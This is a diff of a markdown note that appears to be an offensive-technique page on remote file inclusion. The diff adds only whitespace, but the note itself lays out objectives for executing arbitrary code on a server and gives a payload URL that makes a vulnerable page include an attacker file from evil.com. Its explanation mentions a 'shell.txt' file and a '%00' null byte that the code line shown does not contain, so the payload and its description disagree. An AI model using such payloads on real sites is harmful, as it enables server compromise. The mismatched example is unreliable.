@@ -28,9 +28,13 @@ From a technical perspective, this technique works by exploiting the way that so
 
 The business value of this technique is that it allows attackers to gain access to sensitive data or execute arbitrary code on a server, which can lead to data theft, system compromise, or other malicious activity.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable web application
+
+ 
 
 ## Defense
 
@@ -40,17 +44,27 @@ The business value of this technique is that it allows attackers to gain access 
 
 1. Monitor web application logs for suspicious activity
 
+ 
+
 ## Objectives
 
 1. To exploit a web application that includes user input in file paths without proper sanitization
 
 1. To execute arbitrary code on the server
 
+ 
+
 # Instructions
 
 1. To execute this command, replace 'http://example.com/index.php?page=' with the vulnerable file path of the target web application, and replace 'http://evil.com/shell.txt' with the URL of the attacker's shell file.
 
+ 
+
+
+
 **Code**: [[http://example.com/index.php?page=http://evil.com/]]
+
+
 
 > This command exploits a vulnerable web application that includes user input in file paths without proper sanitization. The '%00' appended at the end of the URL is a null byte that tricks the application into including the attacker's shell file instead of the intended file. Once the shell file is included, the attacker can execute arbitrary code on the server.
 
@@ -59,3 +73,5 @@ The business value of this technique is that it allows attackers to gain access 
 - [[Basic RFI]]
 - [[File Inclusion]]
 - [[Null byte]]
+
+
